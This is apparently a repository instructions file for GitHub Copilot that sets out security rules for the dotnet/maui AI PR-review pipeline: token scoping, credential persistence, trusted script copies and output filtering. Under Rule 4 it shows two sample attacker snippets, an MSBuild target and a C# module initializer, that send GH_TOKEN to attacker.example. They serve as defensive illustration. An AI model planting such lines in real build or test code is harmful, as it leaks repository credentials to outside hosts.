---
description: "Security rules for the Copilot PR-review pipeline: token scoping, trusted-script copy, PR-controlled code isolation, AzDO/git credential handling."
applyTo: "eng/pipelines/ci-copilot.yml, .github/scripts/Review-PR.ps1, .github/scripts/Review-PR.Tests.ps1, .github/scripts/BuildAndRunHostApp.ps1, .github/scripts/BuildAndRunSandbox.ps1, .github/scripts/Find-RegressionRisks.ps1, .github/scripts/Post-CodeReview.ps1, .github/scripts/post-inline-review.ps1, .github/scripts/post-ai-summary-comment.ps1, .github/scripts/post-pr-finalize-comment.ps1, .github/scripts/shared/**, .github/skills/pr-review/**, .github/skills/verify-tests-fail-without-fix/**, .github/skills/try-fix/**, .github/skills/run-device-tests/scripts/**, .github/pr-review/**, .github/workflows/review-trigger.yml, .github/workflows/pr-review-queue.yml, .github/workflows/copilot-evaluate-tests.md, .github/workflows/copilot-evaluate-tests.lock.yml, eng/scripts/detect-ui-test-categories.ps1"
---

# CI Copilot Pipeline — Security Rules

This pipeline runs **untrusted PR code** (anything contributed in `dotnet/maui` PRs, including PRs from forks) on AzDO hosted agents **with privileged tokens in scope**:

| Token | Identity | Scope |
|-------|----------|-------|
| `GH_COMMENT_TOKEN` (a.k.a. `GH_TOKEN`) | `maui-bot` PAT | comment / label / review on every PR in the repo |
| `COPILOT_GITHUB_TOKEN` | Copilot app install token | enables the GitHub Copilot CLI |
| AzDO GitHub service-connection PAT (`dnceng-maui`) | GitHub App install token owned by DncEng | repo contents, PRs, issues, checks, workflows |

A successful exfil of **any** of these = the attacker can take over PR review, post on behalf of the bot, push commits, or worse. Defending against this is non-negotiable when touching any file in this pipeline.

---

## Threat model — assume the PR is hostile

By the time Gate runs, the PR's code has been merged into the working tree. The PR author controls:

- every file in the merged worktree (`.csproj`, `Directory.Build.targets`, `Directory.Build.props`, `*.cs`, `*.targets`, `*.props`, `*.yml`, source generators, analyzers, test code, `eng/`, `.github/` if not specifically protected)
- everything the pipeline subsequently `dotnet build`s, `dotnet test`s, or `pwsh -File`s out of the worktree
- anything those processes can write to under `$(Build.SourcesDirectory)` (working tree) including spoofing trusted output files

The PR author **cannot** modify files copied to `$(Build.ArtifactStagingDirectory)/trusted-github/` **before** the PR is merged, **as long as those files are made read-only after copy**.

---

## Rule 1 — Per-task token scoping (AzDO `env:` block)

Each task's `env:` block contains **only** the tokens that exact task needs.

```yaml
# ✅ correct — Task 3 (CopilotReview) gets ONLY the copilot token
- bash: |
    pwsh -NoProfile "$TRUSTED/scripts/Review-PR.ps1" -Phase CopilotReview ...
  env:
    COPILOT_GITHUB_TOKEN: $(COPILOT_TOKEN)
    # NO GH_TOKEN here — Copilot can't post comments or push
```

```yaml
# ❌ wrong — leaks the comment token into the Copilot agent's env
- bash: |
    pwsh -NoProfile "$TRUSTED/scripts/Review-PR.ps1" -Phase CopilotReview ...
  env:
    COPILOT_GITHUB_TOKEN: $(COPILOT_TOKEN)
    GH_TOKEN: $(GH_COMMENT_TOKEN)
```

When invoking the Copilot CLI, also pass `--secret-env-vars=GH_TOKEN,COPILOT_GITHUB_TOKEN,GITHUB_TOKEN` so the CLI redacts them from its own argv/log output.

## Rule 2 — `persistCredentials: false` on every `checkout: self`

AzDO's default `checkout: self` writes the service-connection PAT to `.git/config` as:

```
[http "https://github.com/"]
    extraheader = AUTHORIZATION: bearer <PAT>
```

Any subprocess on the runner — including PR-controlled code — can `cat .git/config` and exfiltrate it. **Always** add `persistCredentials: false` unless the task itself needs to push.

```yaml
# ✅ correct
- checkout: self
  persistCredentials: false
  fetchDepth: 1
```

```yaml
# ❌ wrong — service-connection PAT persists in .git/config for the rest of the job
- checkout: self
  fetchDepth: 1
```

This applies to **every** job/stage in this pipeline (the PR-review job, the deep-UI-tests job, the post-comment job, etc.), not just the one that runs the agent.

## Rule 3 — Copy trusted scripts BEFORE the PR is merged, then make them read-only

The Setup task does `checkout: self` of `main` (no PR merge yet) and copies known-good scripts/skills/configs to a trusted directory. Subsequent tasks must invoke those scripts **from the trusted copy**, never from the merged worktree.

```bash
# ✅ correct — in Setup task, BEFORE any `git merge` of PR code
TRUSTED="$(Build.ArtifactStagingDirectory)/trusted-github"
mkdir -p "$TRUSTED"
cp -r .github/scripts "$TRUSTED/scripts"
cp -r .github/skills  "$TRUSTED/skills"
cp -r eng/scripts     "$TRUSTED/eng-scripts"
chmod -R a-w "$TRUSTED"   # ← prevents PR code from rewriting trusted scripts at runtime
```

When adding a new pipeline step that invokes a `.ps1`/`.sh`/`.py` script from the repo, follow the convention in `Review-PR.ps1`:

```powershell
# ✅ correct — resolve via the trusted dir
$ScriptsDir    = if ($TrustedScriptsDir) { Join-Path $TrustedScriptsDir 'scripts' }     else { $PSScriptRoot }
$SkillsDir     = if ($TrustedScriptsDir) { Join-Path $TrustedScriptsDir 'skills' }      else { Join-Path $PSScriptRoot '../skills' }
$EngScriptsDir = if ($TrustedScriptsDir) { Join-Path $TrustedScriptsDir 'eng-scripts' } else { Join-Path $PSScriptRoot '../../eng/scripts' }

& "$SkillsDir/foo/scripts/foo.ps1" ...
```

```powershell
# ❌ wrong — runs the PR's version of the script, with all of Gate's tokens in env
$detectScript = Join-Path $RepoRoot "eng/scripts/detect-ui-test-categories.ps1"
& $detectScript -PRNumber $PRNumber
```

**If you add a new script** that needs to be invoked after PR merge, you must also add it to the Setup-task copy block and reference it via the corresponding `$*Dir` variable.

## Rule 4 — Strip tokens from env before invoking PR-controlled code

Even when the *calling* script is trusted, the *subprocess* may be PR-controlled. `dotnet build`/`dotnet test`/`dotnet run` execute the PR's MSBuild graph (`Directory.Build.targets`, `.csproj` `<Target>` blocks, source generators, analyzers, then the test/app code). Any of those can read `Environment.GetEnvironmentVariable("GH_TOKEN")` or `$(GH_TOKEN)` MSBuild property and exfiltrate via:

```xml
<!-- attacker's Directory.Build.targets -->
<Target Name="Exfil" BeforeTargets="Build">
  <Exec Command="curl attacker.example/?t=$(GH_TOKEN)" />
</Target>
```

```csharp
// attacker's test code
[ModuleInitializer]
public static void Leak() => HttpClient.GetAsync("attacker.example/?t=" +
    Environment.GetEnvironmentVariable("GH_TOKEN"));
```

The same applies to invocations of `BuildAndRunHostApp.ps1`, `Run-DeviceTests.ps1`, `verify-tests-fail.ps1`, `Invoke-UITestWithRetry.ps1` — all of these *internally* run `dotnet build`/`dotnet test` against PR code.

Use the `Invoke-WithoutGhTokens` helper in `Review-PR.ps1` (or add an equivalent if writing a new orchestration script):

```powershell
# ✅ correct — token stripped for the subprocess only, restored after
$testOutput = Invoke-WithoutGhTokens {
    dotnet test $resolvedProj --filter $t.Filter --logger "console;verbosity=minimal" 2>&1
}
```

```powershell
# ❌ wrong — Gate has GH_TOKEN in env; the PR-modified .csproj inherits it
$testOutput = dotnet test $resolvedProj --filter $t.Filter ...
```

**Trusted metadata-fetch scripts** (`Detect-TestsInDiff.ps1`, `Find-RegressionRisks.ps1`, `detect-ui-test-categories.ps1`) call `gh` CLI and **need** `GH_TOKEN`. Don't wrap them. The split is: *trusted script reading PR metadata via `gh`* → keeps `GH_TOKEN`; *trusted script invoking PR-controlled code* → wraps in `Invoke-WithoutGhTokens`.

## Rule 5 — Cross-phase signal files live outside the working tree

The merged worktree is writable by any PR-controlled process. Anything the next phase trusts (gate verdict, sentinel files, category lists, phase-complete markers) must be written to `$(Agent.TempDirectory)` (or `$TRUSTED`), **never** to a path inside `$RepoRoot`.

```powershell
# ✅ correct — Agent.TempDirectory is per-job, outside the worktree, not writable by PR code
$gateVerdictDir = if ($env:AGENT_TEMPDIRECTORY) { $env:AGENT_TEMPDIRECTORY } else { Join-Path $RepoRoot "CustomAgentLogsTmp/..." }
"PASS" | Set-Content (Join-Path $gateVerdictDir "gate-result.txt")
```

```powershell
# ❌ wrong — a malicious test in the PR can overwrite gate-result.txt with "PASS"
"PASS" | Set-Content (Join-Path $RepoRoot "CustomAgentLogsTmp/.../gate-result.txt")
```

The corresponding sentinel-read in a later phase MUST live at the same trusted location and MUST NOT silently fall back to the worktree path if missing.

## Rule 6 — Strip `##vso[...]` from PR-controlled output

`##vso[task.setvariable variable=X]value` lines in stdout are interpreted by the AzDO agent as commands to set pipeline variables. PR-controlled code (test output, build output) must have those stripped before the agent sees them, otherwise the PR can promote attacker-controlled values into pipeline variables read by subsequent tasks.

```bash
# ✅ correct — strip CR (Windows line endings would slip past a simpler regex), then drop vso commands
"$TRUSTED/scripts/Review-PR.ps1" ... 2>&1 | tr -d '\r' | sed -E 's/##vso\[[^]]*\]//g'
```

```bash
# ❌ wrong — bare sed won't match if PR output has CRLF line endings
"$TRUSTED/scripts/Review-PR.ps1" ... 2>&1 | sed 's/##vso\[.*\]//g'
```

## Rule 7 — `gh-aw` workflows: pin version, regenerate `.lock.yml`, restore trusted `.github/`

For files under `.github/workflows/shared/` and any `gh-aw` `.md` workflow:

- **Pin the gh-aw compiler version.** Versions ≥ v0.68.4 strip required permissions (`pull-requests: write`) — see `gh-aw#28767`. Pin to a known-good version in the workflow frontmatter.
- **Regenerate the `.lock.yml`** with `gh aw compile` **in the same commit** as any `.md` frontmatter change. A stale lock file causes every dispatch to fail with `ERR_CONFIG: Lock file ... is outdated!`.
- **`workflow_dispatch` triggers must restore trusted `.github/` from main** (use `.github/scripts/Checkout-GhAwPr.ps1` pattern) so that a malicious PR can't supply its own workflow logic via `workflow_dispatch`.

## Rule 8 — Don't pass tokens through pipeline variables that subsequent tasks read

```yaml
# ❌ wrong — once written to AzDO variable store, the value is visible to every later task
- bash: echo "##vso[task.setvariable variable=MyToken;issecret=true]$(GH_TOKEN)"
```

Tokens come from variable groups linked at the pipeline level. Don't republish them. Don't write them to files in the worktree. Don't `echo` them — even with `issecret=true`, this widens the blast radius.

---

## Code-review checklist for this surface

When reviewing or authoring a change to any file matched by this instruction's `applyTo`, walk this list:

- [ ] Every new/modified AzDO `checkout: self` has `persistCredentials: false` (unless the task pushes, in which case add a comment explaining why).
- [ ] Every new/modified `env:` block on a task contains **only** the tokens that task needs. The Copilot-agent task never has `GH_TOKEN`.
- [ ] Every new script invoked from the pipeline after PR merge is resolved via `$ScriptsDir` / `$SkillsDir` / `$EngScriptsDir` (or the calling script's equivalent), not `$RepoRoot/...`.
- [ ] If a new script was added to `.github/scripts/`, `.github/skills/`, or `eng/scripts/` that needs to run post-merge, it's covered by the trusted-copy block in `ci-copilot.yml` Setup task.
- [ ] Every new invocation of `dotnet build|test|run|pack`, `msbuild`, `dotnet cake`, `BuildAndRunHostApp.ps1`, `BuildAndRun*.ps1`, `Run-DeviceTests.ps1`, `verify-tests-fail.ps1`, `Invoke-UITestWithRetry.ps1`, or any other process that executes PR-controlled code is wrapped in `Invoke-WithoutGhTokens { ... }`.
- [ ] Every cross-phase signal file (verdict, sentinel, intermediate state) is written to `$(Agent.TempDirectory)` / `$TRUSTED`, never to `$RepoRoot/...`.
- [ ] Any new pipeline output that includes stdout from PR-controlled code is filtered with `tr -d '\r' | sed -E 's/##vso\[[^]]*\]//g'`.
- [ ] If a `.github/workflows/*.md` (gh-aw) was edited, the corresponding `.lock.yml` was regenerated with `gh aw compile` in the same commit.
- [ ] Token names are never written to log lines, even with `Write-Host`/`echo`. Token *values* are never written to files in the worktree.

## Anti-patterns to grep for during review

```bash
# Token leak to PR-controlled subprocess
git grep -nE 'dotnet (test|build|run|pack)' eng/pipelines/ci-copilot.yml .github/scripts/ .github/skills/ | grep -v Invoke-WithoutGhTokens

# Script invoked from PR worktree instead of trusted copy
git grep -nE 'Join-Path \$RepoRoot ".*\.(ps1|sh)"' .github/scripts/ .github/skills/

# Missing persistCredentials
git grep -nA1 'checkout: self' eng/pipelines/ci-copilot.yml | grep -v persistCredentials

# Cross-phase state in worktree
git grep -nE 'Set-Content.*\$RepoRoot.*(gate-result|sentinel|verdict)' .github/scripts/ .github/skills/

# Bare ##vso strip without CR handling
git grep -nE "sed.*##vso" eng/pipelines/ci-copilot.yml | grep -v "tr -d"
```

---

## References

- **PR #35324** — refactor that introduced the 4-task split and surfaced these issues
- **MauiBot 2026-05-24 review** of PR #35324 — flagged Rules 3 and 4 violations
- **PR #35376** — earlier change that re-introduced missing `persistCredentials: false` on cross-stage checkouts
- **`Review-PR.ps1`** — canonical implementation of `$ScriptsDir`/`$SkillsDir`/`$EngScriptsDir` resolution and `Invoke-WithoutGhTokens` helper
- **`ci-copilot.yml` Setup task** — canonical trusted-copy + `chmod -R a-w` pattern
